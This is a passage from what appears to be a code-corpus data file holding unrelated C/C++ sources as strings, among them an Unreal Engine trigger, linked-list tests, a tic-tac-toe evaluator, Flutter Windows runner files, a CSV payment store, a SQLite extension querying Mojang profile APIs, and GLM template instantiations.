APlatformTrigger::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n}\n\n// Called every frame\nvoid APlatformTrigger::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\n}\n\nvoid APlatformTrigger::Activate(UPrimitiveComponent* OverlappedComponent, AActor* OtherActor, UPrimitiveComponent* OtherComponent, int32 OtherBodyIndex, bool bFromSweep, const FHitResult& SweepHitResult)\n{\n\tPlayerOnTrigger++;\n\tif (PlayerOnTrigger == 1)\n\t{\n\t\tUE_LOG(LogTemp, Display, TEXT(\"%s is Activated.\"), *GetName());\n\t\tfor (AMovingPlatform* Platform : TargetPlatformList)\n\t\t{\n\t\t\tPlatform->AddActivatedTrigger();\n\t\t}\n\t}\n}\n\nvoid APlatformTrigger::Deactivate(UPrimitiveComponent* OverlappedComp, AActor* OtherActor, UPrimitiveComponent* OtherComp, int32 OtherBodyIndex)\n{\n\tif (PlayerOnTrigger == 1)\n\t{\n\t\tUE_LOG(LogTemp, Display, TEXT(\"%s is Deactivated.\"), *GetName());\n\t\tfor (AMovingPlatform* Platform : TargetPlatformList)\n\t\t{\n\t\t\tPlatform->RemoveActivatedTrigger();\n\t\t}\n\t}\n\n\tPlayerOnTrigger--;\n}\n\n",
    " #include <assert.h>\r\n#include <exception>\r\n\r\n#include \"TestExtins.h\"\r\n#include \"IteratorLP.h\"\r\n#include \"Lista.h\"\r\n\r\nusing namespace std;\r\n\r\nvoid testAllExtins() {\r\n    Lista lista = Lista(); // creem lista vida\r\n    assert(lista.vida());\r\n    IteratorLP it0 = lista.prim(); //creem un iterator pe lista vida\r\n    assert(!it0.valid());\r\n    try {\r\n        it0.element();  // nu ar trebui sa fie posibil ca iteratorul sa returneze un element\r\n        assert(false);\r\n    } catch (exception&) {\r\n        assert(true);\r\n    }\r\n\r\n    lista.adaugaSfarsit(1); // lista e [1]\r\n    assert(lista.dim() == 1);\r\n    IteratorLP it = lista.prim();\r\n    assert(it.element() == 1);\r\n\r\n    IteratorLP it2 = lista.prim(); //creem un al doilea iterator\r\n    for (int i = 0; i < 100; i++){ //adaugam 100 de elemente\r\n        lista.adaugaSfarsit(i);\r\n        if (i<=50){ // al doilea iterator il setam sa arate pozitia unde valoarea va fi 50\r\n            it2.urmator();\r\n        }\r\n        it.urmator();\r\n        assert(it.element() == i); // primul iterator va arata ultima pozitie\r\n    } // lista este acum [1,0,1,2,3,...,97,98,99] de lungime 101\r\n    assert(it2.element() == 50);\r\n    assert(lista.dim() == 101);\r\n    assert(it.valid());\r\n    it.urmator(); //primul iterator va deveni invalid\r\n    assert(!it.valid());\r\n    try {\r\n        lista.element(it);\r\n        assert(false);\r\n    } catch (exception&) {\r\n        assert(true);\r\n    }\r\n\r\n\r\n    IteratorLP it3 = lista.cauta(50); //creem un al treilea iterator care ar trebui sa arate pozitia unde valoarea e 50\r\n    assert(it3.valid());    // Iteratori: it - arata o pozitie invalida, it2, it3 - arata catre pozitia cu valoarea 50\r\n    assert(it3.element() == 50);\r\n    TElem vechi = lista.modifica(it3, 51);\r\n    assert(vechi == 50);\r\n    assert(it3.element() == it2.element()); //ambii iteratori arata catre aceeasi pozitie in aceeasi lista, deci si elementul catre care arata it2 s-a schimbat\r\n    IteratorLP it3_2 = lista.cauta(50); //cautam o valore care nu mai exista, ar trebui sa returneze un iterator invalid\r\n    assert(!it3_2.valid());\r\n    try {\r\n        lista.adauga(it3_2, 0);\r\n        assert(false);\r\n    } catch (exception&) {\r\n        assert(true);\r\n    }\r\n    IteratorLP it4 = lista.cauta(99); //Creem un nou iterator\r\n    assert(it4.element() == 99);\r\n    it4.urmator(); // invalidam iteratorul.\r\n    assert(!it4.valid());\r\n    try {\r\n        it4.urmator();\r\n        assert(false);\r\n    } catch (exception&){\r\n        assert(true);\r\n    }\r\n    IteratorLP it3_3 = lista.cauta(51);\r\n    lista.adauga(it3_3, 150);\r\n    assert(it3_3.element() == 150);\r\n\r\n    IteratorLP it5 = lista.cauta(51);\r\n    lista.modifica(it5, 50);\r\n    assert(lista.element(it5) == 50);\r\n    TElem vechi_2 = lista.sterge(it3_3); //stergem elementul de la it3_3\r\n    assert(vechi_2 == 150);\r\n\r\n    //verificam ca nu se poate modifica/sterge la o pozitie invalida\r\n    try {\r\n        lista.modifica(it, 0);\r\n        assert(false);\r\n    } catch (exception&) {\r\n        assert(true);\r\n    }\r\n    try {\r\n        lista.sterge(it);\r\n        assert(false);\r\n    } catch (exception&) {\r\n        assert(true);\r\n    }\r\n}\r\n\r\n\r\n\r\n    ",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <time.h>\n#include \"functions.h\"\n\nvoid olas\u0131l\u0131k_2(int matris[3][3], int sayac[2], int oyuncu_degiskeni)\n{\n    int klon[3][3], olas\u0131l\u0131klar_2[2][9], sayac_3;\n    matrisi_kopyala(matris, klon);\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            if (klon[i][j] == 0)\n            {\n                klon[i][j] = oyuncu_degiskeni;\n                sayac_3 = kazanan_kontrolu(klon, oyuncu_degiskeni);\n                if (sayac_3 == 1)\n                {\n                    sayac[0]++;\n                    return;\n                }\n                if (sayac_3 == 2)\n                {\n                    sayac[1]++;\n                    return;\n                }\n            }\n            olas\u0131l\u0131k_2(klon, sayac, 3 - oyuncu_degiskeni);\n            klon[i][j] = 0;\n        }\n    }\n}\n\nvoid en_iyi_olas\u0131l\u0131k(int olas\u0131l\u0131klar[2][9], int sonuc[3], int oyuncu_degiskeni)\n{\n    int en_iyi, en_k\u00f6t\u00fc, sayac = 0;\n    for (int i = 0; i < 9; i++)\n    {\n        if (olas\u0131l\u0131klar[0][i] == 0 ^ olas\u0131l\u0131klar[1][0] == 0)\n        {\n            if (olas\u0131l\u0131klar[0][i] == 0)\n            {\n                sayac = 1;\n                en_iyi = i;\n            }\n            if (olas\u0131l\u0131klar[1][i] == 0)\n            {\n                sayac = 1;\n                en_k\u00f6t\u00fc = i;\n            }\n        }\n    }\n    if (sayac == 1)\n    {\n        if (oyuncu_degiskeni == 1)\n        {\n            sonuc[0] = 1;\n            sonuc[1] = en_iyi / 3;\n            sonuc[2] = en_iyi % 3;\n            return;\n        }\n        else\n        {\n            sonuc[0] = 1;\n            sonuc[1] = en_k\u00f6t\u00fc / 3;\n            sonuc[2] = en_k\u00f6t\u00fc % 3;\n            return;\n        }\n    }\n\n    float oran_1, oran_2, en_iyi_oran = 0, en_k\u00f6t\u00fc_oran = 0;\n\n    for (int i = 0; i < 3; i++)\n    {\n        if (olas\u0131l\u0131klar[0][i] != 0 && olas\u0131l\u0131klar[1][0] != 0)\n        {\n            oran_1 = olas\u0131l\u0131klar[0][i];\n            oran_2 = olas\u0131l\u0131klar[1][i];\n\n            if (oran_1 / oran_2 > en_iyi_oran)\n            {\n                sayac = 1;\n                en_iyi_oran = oran_1 / oran_2;\n                en_iyi = i;\n            }\n            if (oran_1 / oran_2 < en_k\u00f6t\u00fc_oran)\n            {\n                sayac = 1;\n                en_k\u00f6t\u00fc_oran = oran_1 / oran_2;\n                en_k\u00f6t\u00fc = i;\n            }\n        }\n    }\n    if (sayac == 1)\n    {\n        if (oyuncu_degiskeni == 1)\n        {\n            sonuc[0] = 1;\n            sonuc[1] = en_iyi / 3;\n            sonuc[2] = en_iyi % 3;\n            return;\n        }\n        else\n        {\n            sonuc[0] = 1;\n            sonuc[1] = en_k\u00f6t\u00fc / 3;\n            sonuc[2] = en_k\u00f6t\u00fc % 3;\n            return;\n        }\n    }\n}\n\nvoid olas\u0131l\u0131k(int matris[3][3], int sonuc[3], int oyuncu_degiskeni)\n{\n    int klon[3][3], olas\u0131l\u0131klar[2][9], sayac[2];\n    matrisi_kopyala(matris, klon);\n    matrisi_initialize_et(&olas\u0131l\u0131klar[0][0], 2, 9);\n    sayac[0] = 0;\n    sayac[1] = 0;\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            if (klon[i][j] == 0)\n            {\n                klon[i][j] = oyuncu_degiskeni;\n                olas\u0131l\u0131k_2(klon, sayac, 3 - oyuncu_degiskeni);\n                olas\u0131l\u0131klar[0][3 * i + j] = sayac[0];\n                olas\u0131l\u0131klar[1][3 * i + j] = sayac[1];\n                klon[i][j] = 0;\n            }\n        }\n    }\n    en_iyi_olas\u0131l\u0131k(olas\u0131l\u0131klar, sonuc, oyuncu_degiskeni);\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <string>\n#include <stdexcept>\n//#include \"payment.h\"\n#include \"productInCart.h\"\n\nPayment::Payment(int _id, int _userId, double _value) : BaseEntity(_id), userId(_userId), value(_value){};\n// Getter functions\nint Payment::getUserId() const\n{\n\treturn userId;\n}\n\ndouble Payment::getValue() const\n{\n\treturn value;\n}\n\n// Setter functions\nvoid Payment::setUserId(int newUserId)\n{\n\tuserId = newUserId;\n}\n\nvoid Payment::setValue(double newValue)\n{\n\tvalue = newValue;\n}\n\n// Functions for storing and reading payments from file\nvoid Payment::writeData(const vector<Payment> &payments)\n{\n\t/*\n\tofstream file(filename);\n\n\tif (file.is_open()) {\n\t\t// Write header row\n\t\tfile << \"ID\\tUser ID\\tValue\\n\";\n\n\t\t// Write each payment to file\n\t\tfor (const auto& payment : payments) {\n\t\t\tfile << payment.getId() << '\\t'\n\t\t\t\t<< payment.getUserId() << '\\t'\n\t\t\t\t<< payment.getValue() << '\\n';\n\t\t}\n\n\t\tfile.close();\n\t}\n\telse {\n\t\tthrow runtime_error(\"Unable to open file for writing.\");\n\t}*/\n\tofstream file(filename);\n\n\tif (file.is_open())\n\t{\n\t\tfile << \"id,userId,value\\n\"; // write header row\n\n\t\tfor (const auto &payment : payments)\n\t\t{\n\t\t\tfile << payment.getId() << \",\" << payment.userId << \",\" << payment.value << \"\\n\";\n\t\t}\n\n\t\tfile.close();\n\t}\n\telse\n\t{\n\t\tcout << \"Unable to open file\";\n\t}\n}\n\nvector<Payment> Payment::readData()\n{\n\t/*\n\tvector<Payment> payments;\n\n\tifstream file(filename);\n\n\tif (file.is_open()) {\n\t\tstring line;\n\t\tgetline(file, line); // Skip header row.\n\n\t\twhile (getline(file, line)) {\n\t\t\tPayment payment;\n\n\t\t\tistringstream iss(line);\n\t\t\tif (!(iss >> payment.id >> payment.userId >> payment.value)) {\n\t\t\t\tthrow runtime_error(\"Invalid file format.\");\n\t\t\t}\n\n\t\t\tpayments.push_back(payment);\n\t\t}\n\n\t\tfile.close();\n\t}\n\telse {\n\t\tthrow runtime_error(\"Unable to open file for reading.\");\n\t}\n\n\treturn payments;*/\n\tvector<Payment> payments;\n\tifstream file(filename);\n\tstring line;\n\n\tif (file.is_open())\n\t{\n\t\tgetline(file, line); // skip header row\n\n\t\twhile (getline(file, line))\n\t\t{\n\t\t\tstringstream ss(line);\n\t\t\tstring field;\n\t\t\tvector<string> fields;\n\n\t\t\twhile (getline(ss, field, ','))\n\t\t\t{\n\t\t\t\tfields.push_back(field);\n\t\t\t}\n\n\t\t\tint id = stoi(fields[0]);\n\t\t\tint userId = stoi(fields[1]);\n\t\t\tdouble value = stod(fields[2]);\n\n\t\t\tpayments.push_back(Payment(id, userId, value));\n\t\t}\n\n\t\tfile.close();\n\t}\n\telse\n\t{\n\t\tcout << \"Unable to open file\";\n\t}\n\n\treturn payments;\n}\nstring Payment::savePayment(int cartId)\n{\n\t// vector <Payment> payments = readData();\n\tvector<ProductInCart> ProductsinCart = ProductInCart::readData();\n\tfor (ProductInCart cart : ProductsinCart)\n\t{\n\t\tstatic int count = 0;\n\t\tif (cart.getCartId() == cartId)\n\t\t{\n\t\t\tProductsinCart.erase(ProductsinCart.begin() + count);\n\t\t}\n\t\telse\n\t\t\tcount++;\n\t}\n\tProductInCart::writeData(ProductsinCart);\n\treturn \"Payment saved successfully!\";\n}\nconst string Payment::filename = \"payments.csv\";",
    "#include <cstdio>\n#include <cassert>\n#include <cstdint>\n#include <chrono>\n#include <cstring>\n#include <string_view>\n\n#include <curl/curl.h>\n#include <json-c/json.h>\n\n#include <sqlite3ext.h> /* Do not use <sqlite3.h>! */\nSQLITE_EXTENSION_INIT1\n\nbool isValidHexChar(char c) {\n    return ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'));\n}\n\nstd::optional<std::string> normalize_uuid(std::string_view uuid) {\n    std::string out;\n    out.reserve(36);\n    int hyphens = 0;\n    int hex_chars = 0;\n    for (char c : uuid) {\n        if (c == '-') {\n            hyphens++;\n            if (hyphens > 4) return {}; // Too many hyphens\n        }\n        else if (isValidHexChar(c)) {\n            hex_chars++;\n            if (hex_chars > 32) return {}; // Too many hex chars\n            out.push_back(tolower(c));\n            if (hex_chars == 8 || hex_chars == 12 || hex_chars == 16 || hex_chars == 20) {\n                out.push_back('-');\n            }\n        } else {\n            return {}; // invalid uuid\n        }\n    }\n    if (hex_chars < 32) return {};\n    return out;\n}\n\nstruct Profile {\n    std::string uuid;\n    std::string name;\n};\n\nstd::optional<Profile> parse_profile(const char* json_str) {\n    json_object *json = json_tokener_parse(json_str);\n    json_object *name_obj{};\n    json_object *id_obj{};\n    if (json_object_object_get_ex(json, \"name\", &name_obj) && json_object_object_get_ex(json, \"id\", &id_obj)) {\n        // if not valid uuid this throws exception\n        auto normal_uuid = normalize_uuid(json_object_get_string(id_obj)).value();\n        return {Profile{\n            .uuid = std::move(normal_uuid),\n            .name = json_object_get_string(name_obj),\n        }};\n    }\n    return {};\n}\n\nsize_t write_callback(char* data, size_t size, size_t nmemb, std::string* str) {\n    str->append(data, size * nmemb);\n    return size * nmemb;\n}\n\nstd::optional<Profile> fetch_profile(const char* url, std::string* error_out) {\n    CURL *curl = curl_easy_init();\n    assert(curl);\n    curl_easy_setopt(curl, CURLOPT_URL, url);\n    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);\n    std::string response;\n    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);\n    char error[CURL_ERROR_SIZE];\n    curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, &error);\n    CURLcode res = curl_easy_perform(curl);\n    long http_code;\n    curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);\n    if (res != CURLE_OK) {\n        *error_out = error;\n        return {};\n    } else if (http_code == 200) {\n        return parse_profile(response.c_str());\n    } else {\n        *error_out = \"Mojang API returned http code \" + std::to_string(http_code);\n        return {};\n    }\n}\n\nstd::optional<Profile> fetch_profile_by_uuid(const char* uuid, std::string* error) {\n    std::string url = std::string{\"https://sessionserver.mojang.com/session/minecraft/profile/\"} + uuid;\n    return fetch_profile(url.c_str(), error);\n}\n\nstd::optional<Profile> fetch_profile_by_name(const char* name, std::string* error) {\n    std::string url = std::string{\"https://api.mojang.com/users/profiles/minecraft/\"} + name;\n    return fetch_profile(url.c_str(), error);\n}\n\nvoid update_cache(sqlite3* db, const char* uuid, const char* name, int64_t created_at) {\n    const char *sql = \"INSERT OR REPLACE INTO mc_profile_cache(uuid, name, created_at) VALUES(?, ?, ?)\";\n    sqlite3_stmt *stmt;\n    sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);\n    sqlite3_bind_text(stmt, 1, uuid, -1, SQLITE_TRANSIENT);\n    sqlite3_bind_text(stmt, 2, name, -1, SQLITE_TRANSIENT);\n    sqlite3_bind_int64(stmt, 3, created_at);\n    sqlite3_step(stmt);\n    sqlite3_finalize(stmt);\n}\n\nvoid lookup0(sqlite3_context* ctx, const char* argument, bool uuid) {\n    sqlite3* db = sqlite3_context_db_handle(ctx);\n\n    auto fetch = uuid ? fetch_profile_by_uuid : fetch_profile_by_name;\n    const char *sql = uuid ?\n            \"SELECT name,uuid,created_at FROM mc_profile_cache WHERE uuid = ?\"\n            : \"SELECT name,uuid,created_at FROM mc_profile_cache WHERE name = ?\";\n    sqlite3_stmt *stmt;\n    sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);\n    sqlite3_bind_text(stmt, 1, argument, -1, SQLITE_TRANSIENT);\n\n    int64_t now = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();\n    constexpr int64_t millis_in_hour = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::hours{1}).count();\n    // Execute SQL statement\n    int err = sqlite3_step(stmt);\n    if (err == SQLITE_ROW) {\n        auto cached_name = (const char*) sqlite3_column_text(stmt, 0);\n        auto cached_uuid = (const char*) sqlite3_column_text(stmt, 1);\n        auto cached_result = uuid ? cached_name : cached_uuid;\n        int64_t created_at = sqlite3_column_int64(stmt, 2);\n        if (now - created_at < millis_in_hour) {\n            sqlite3_result_text(ctx, cached_result, strlen(cached_result), SQLITE_TRANSIENT);\n        } else {\n            std::string erro",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include \"Expression.h\"\n\nusing namespace std;\n\nvoid Show_Menu()\n{\n\tExpression v;\n\tint Expression_Num, key;\n\tbool Is_Float, Is_Bracket, Is_Need_File;\n\tstring S1, S2, S3, Ops;\n\tint MaxV;\n\tcout << \"\u8bf7\u8f93\u5165\u8981\u4ea7\u751f\u7684\u56db\u5219\u8fd0\u7b97\u8868\u8fbe\u5f0f\u6570\u91cf:\\n\";\n\tcin >> Expression_Num;\n\tgetchar();\n\tcout << \"\u8bf7\u8f93\u5165\u4f60\u9009\u62e9\u7684\u8fd0\u7b97\u7b26(\u652f\u6301\u4efb\u610f\u8f93\u5165\uff0c\u53ea\u8bc6\u522b\u6709\u6548\u8fd0\u7b97\u7b26(+, -,*,/)\uff0c\u4ee5\u56de\u8f66\u952e\u7ed3\u675f)\\n\";\n\tgetline(cin, Ops);\n\tOps = v.Solve_Input_Ops(Ops);\n\tcout << \"\u8bf7\u8bbe\u7f6e\u6700\u5927\u7684\u8fd0\u7b97\u6570\\n\";\n\tcin >> MaxV;\n\tcout << \"\u7528\u6237\u662f\u5426\u8981\u52a0\u62ec\u53f7?(yes/no)\\n\";\n\tcin >> S1;\n\tcout << \"\u662f\u5426\u6709\u5c0f\u6570?(yes/no)\\n\";\n\tcin >> S2;\n\tcout << \"\u662f\u5426\u60f3\u4fdd\u5b58\u5230\u6587\u4ef6\u4e2d?(yes/no)\\n\";\n\tcin >> S3;\n\tIs_Bracket = (S1 == \"yes\") ? 1 : 0;\n\tIs_Float = (S2 == \"yes\") ? 1 : 0;\n\tIs_Need_File = (S3 == \"yes\") ? 1 : 0;\n\tvector<string> Expressions = v.Generate_Expression(Expression_Num, Ops, MaxV, Is_Bracket, Is_Float);\n\tcout << \"\\n\";\n\tcout << \"\u4ee5\u4e0b\u662f\u751f\u6210\u7684\u8868\u8fbe\u5f0f:\\n\";\n\tfor (auto h : Expressions)\n\t{\n\t\tcout << h << \" = \" << v.Calculate_Expression(h) << \"\\n\";\n\t}\n\tif (Is_Need_File)\n\t\tv.Print_file(Expressions);\n    \n\tcout << \"\u8f93\u51651\uff0c\u7ed3\u675f\u7a0b\u5e8f. \u8f93\u51650, \u91cd\u542f\u7a0b\u5e8f.\";\n\tcin >> key;\n\tif (key)\n\t{\n\t\texit(0);\n\t}\n\tsystem(\"cls\");\n}\n\nint main()\n{\n\tsrand((unsigned)time(NULL));\n\twhile (1)\n\t{\n\t\tShow_Menu();\n\t}\n\treturn 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"login_screen\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/// @ref core\n/// @file glm/glm.cpp\n\n#ifndef GLM_ENABLE_EXPERIMENTAL\n#define GLM_ENABLE_EXPERIMENTAL\n#endif\n#include <glm/gtx/dual_quaternion.hpp>\n#include <glm/gtc/vec1.hpp>\n#include <glm/gtc/quaternion.hpp>\n#include <glm/ext/scalar_int_sized.hpp>\n#include <glm/ext/scalar_uint_sized.hpp>\n#include <glm/glm.hpp>\n\nnamespace glm\n{\n// tvec1 type explicit instantiation\ntemplate struct vec<1, uint8, lowp>;\ntemplate struct vec<1, uint16, lowp>;\ntemplate struct vec<1, uint32, lowp>;\ntemplate struct vec<1, uint64, lowp>;\ntemplate struct vec<1, int8, lowp>;\ntemplate struct vec<1, int16, lowp>;\ntemplate struct vec<1, int32, lowp>;\ntemplate struct vec<1, int64, lowp>;\ntemplate struct vec<1, float32, lowp>;\ntemplate struct vec<1, float64, lowp>;\n\ntemplate struct vec<1, uint8, mediump>;\ntemplate struct vec<1, uint16, mediump>;\ntemplate struct vec<1, uint32, mediump>;\ntemplate struct vec<1, uint64, mediump>;\ntemplate struct vec<1, int8, mediump>;\ntemplate struct vec<1, int16, mediump>;\ntemplate struct vec<1, int32, mediump>;\ntemplate struct vec<1, int64, mediump>;\ntemplate struct vec<1, float32, mediump>;\ntemplate struct vec<1, float64, mediump>;\n\ntemplate struct vec<1, uint8, highp>;\ntemplate struct vec<1, uint16, highp>;\ntemplate struct vec<1, uint32, highp>;\ntemplate struct vec<1, uint64, highp>;\ntemplate struct vec<1, int8, highp>;\ntemplate struct vec<1, int16, highp>;\ntemplate struct vec<1, int32, highp>;\ntemplate struct vec<1, int64, highp>;\ntemplate struct vec<1, float32, highp>;\ntemplate struct vec<1, float64, highp>;\n\n// tvec2 type explicit instantiation\ntemplate struct vec<2, uint8, lowp>;\ntemplate struct vec<2, uint16, lowp>;\ntemplate struct vec<2, uint32, lowp>;\ntemplate struct vec<2, uint64, lowp>;\ntemplate struct vec<2, int8, lowp>;\ntemplate struct vec<2, int16, lowp>;\ntemplate struct vec<2, int32, lowp>;\ntemplate struct vec<2, int64, lowp>;\ntemplate struct vec<2, float32, lowp>;\ntemplate struct vec<2, float64, lowp>;\n\ntemplate struct vec<2, uint8, mediump>;\ntemplate struct vec<2, uint16, mediump>;\ntemplate struct vec<2, uint32, mediump>;\ntemplate struct vec<2, uint64, mediump>;\ntemplate struct vec<2, int8, mediump>;\ntemplate struct vec<2, int16, mediump>;\ntemplate struct vec<2, int32, mediump>;\ntemplate struct vec<2, int64, mediump>;\ntemplate struct vec<2, float32, mediump>;\ntemplate struct vec<2, float64, mediump>;\n\ntemplate struct vec<2, uint8, highp>;\ntemplate struct vec<2, uint16, highp>;\ntemplate struct vec<2, uint32, highp>;\ntemplate struct vec<2, uint64, highp>;\ntemplate struct vec<2, int8, highp>;\ntemplate struct vec<2, int16, highp>;\ntemplate struct vec<2, int32, highp>;\ntemplate struct vec<2, int64, highp>;\ntemplate struct vec<2, float32, highp>;\ntemplate struct vec<2, float64, highp>;\n\n// tvec3 type explicit instantiation\ntemplate struct vec<3, uint8, lowp>;\ntemplate struct vec<3, uint16, lowp>;\ntemplate struct vec<3, uint32, lowp>;\ntemplate struct vec<3, uint64, lowp>;\ntemplate struct vec<3, int8, lowp>;\ntemplate struct vec<3, int16, lowp>;\ntemplate struct vec<3, int32, lowp>;\ntemplate struct vec<3, int64, lowp>;\ntemplate struct vec<3, float32, lowp>;\ntemplate struct vec<3, float64, lowp>;\n\ntemplate struct vec<3, uint8, mediump>;\ntemplate struct vec<3, uint16, mediump>;\ntemplate struct vec<3, uint32, mediump>;\ntemplate struct vec<3, uint64, mediump>;\ntemplate struct vec<3, int8, mediump>;\ntemplate struct vec<3, int16, mediump>;\ntemplate struct vec<3, int32, mediump>;\ntemplate struct vec<3, int64, mediump>;\ntemplate struct vec<3, float32, mediump>;\ntemplate struct vec<3, float64, mediump>;\n\ntemplate struct vec<3, uint8, highp>;\ntemplate struct vec<3, uint16, highp>;\ntemplate struct vec<3, uint32, highp>;\ntemplate struct vec<3, uint64, highp>;\ntemplate struct vec<3, int8, highp>;\ntemplate struct vec<3, int16, highp>;\ntemplate struct vec<3, int32, highp>;\ntemplate struct vec<3, int64, highp>;\ntemplate struct vec<3, float32, highp>;\ntemplate struct vec<3, float64, highp>;\n\n// tvec4 type explicit instantiation\ntemplate struct vec<4, uint8, lowp>;\ntemplate struct vec<4, uint16, lowp>;\ntemplate struct vec<4, uint32, lowp>;\ntemplate struct vec<4, uint64, lowp>;\ntemplate struct vec<4, int8, lowp>;\ntemplate struct vec<4, int16, lowp>;\ntemplate struct vec<4, int32, lowp>;\ntemplate struct vec<4, int64, lowp>;\ntemplate struct vec<4, float32, lowp>;\ntemplate struct vec<4, float64, lowp>;\n\ntemplate struct vec<4, uint8, mediump>;\ntemplate struct vec<4, uint16, mediump>;\ntemplate struct vec<4, uint32, mediump>;\ntemplate struct vec<4, uint64, mediump>;\ntemplate struct vec<4, int8, mediump>;\ntemplate struct vec<4, int16, mediump>;\ntemplate struct vec<4, int32, mediump>;\ntemplate struct vec<4, int64, mediump>;\ntemplate struct vec<4, float32, mediump>;\ntemplate struct vec<4, float64, mediump>;\n\ntemplate struct vec<4, uint8, highp>;\ntemplate struct vec<4, uint16, highp>;\ntemplate struct vec<4, uint32, highp>;\ntemplate struct vec<4, uint64, highp>;\ntemplate struct vec<4, int8, highp>;\ntemplate struct 